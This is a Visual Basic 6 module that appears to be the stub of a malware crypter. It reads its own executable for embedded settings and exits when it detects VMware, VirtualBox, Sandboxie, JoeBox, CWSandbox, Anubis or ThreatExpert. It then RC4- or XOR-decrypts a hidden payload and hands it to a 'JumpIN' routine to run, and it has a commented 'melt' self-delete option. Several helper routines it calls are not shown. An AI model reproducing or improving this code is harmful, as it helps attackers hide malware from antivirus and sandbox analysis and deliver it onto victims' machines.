Attribute VB_Name = "modMain"
Public strPW As String
Public strAPI1 As String
Public strAPI2 As String

Sub Main()
Dim strBuffer1 As String
Dim strArr1() As String
Dim strByte() As Byte

Debug.Print RC4("®ã46G¦3å", "thiho5y62")
Debug.Print RC4("¿ê%Jx¬9ä—", "thiho5y62")
Debug.Print RC4("¶8×KTìn‡º#»þÆ>Vz", "thiho5y")

Open GetFullAppPath For Binary As #1
 strBuffer1 = Space(LOF(1))
 Get #1, , strBuffer1
Close #1

strArr1 = Split(strBuffer1, "_<>_")

If strArr1(3) = "1" Then
If IsVirtualPCPresent = 2 Then End 'VMWARE
End If

If strArr1(4) = "1" Then
If IsInSandbox = 1 Then End 'SANDBOXIE
End If

If strArr1(5) = "1" Then
If IsInSandbox = 5 Then End 'JOEBOX
End If

If strArr1(6) = "1" Then
If IsInSandbox = 4 Then End 'CWSANDBOX
End If

If strArr1(7) = "1" Then
If IsInSandbox = 3 Then End 'ANUBIS
End If

If strArr1(8) = "1" Then
If IsInSandbox = 2 Then End 'THREATEXPERT
End If

If strArr1(9) = "1" Then
If IsVirtualPCPresent = 3 Then End 'VIRTUALBOX
End If

If strArr1(10) = "1" Then
If IsVirtualPCPresent = 1 Then End 'VIRTUALBOX
End If

strPW = strArr1(2)

strAPI1 = RC4(strArr1(11), strPW)
strAPI2 = RC4(strArr1(12), strPW)

If strArr1(14) = "1" Then
 strByte() = RC4(strArr1(1), strPW)
End If

If strArr1(15) = "1" Then
 strByte() = XORcrypt(strBuffer1, strPW)
End If


JumpIN GetFullAppPath, StrConv(strByte(), vbFromUnicode)


If strArr1(13) = "1" Then
 ' "NOW MELT"
End If

End Sub

Public Function XORcrypt(ByVal sStr As String, ByVal sKey As String) As String
Dim i As Long

For i = 1 To Len(sStr)
 XORcrypt = XORcrypt & Chr(Asc(Mid(sKey, IIf(i Mod Len(sKey) <> 0, i Mod Len(sKey), Len(sKey)), 1)) Xor Asc(Mid(sStr, i, 1)))
Next i

End Function

Public Function GetFullAppPath() As String
    Dim lRet        As Long
    Dim bvBuff(255) As Byte
    lRet = APICall("kernel32", "GetModuleFileNameA", App.hInstance, VarPtr(bvBuff(0)), 256)
    GetFullAppPath = Left$(StrConv(bvBuff, vbUnicode), lRet)
End Function

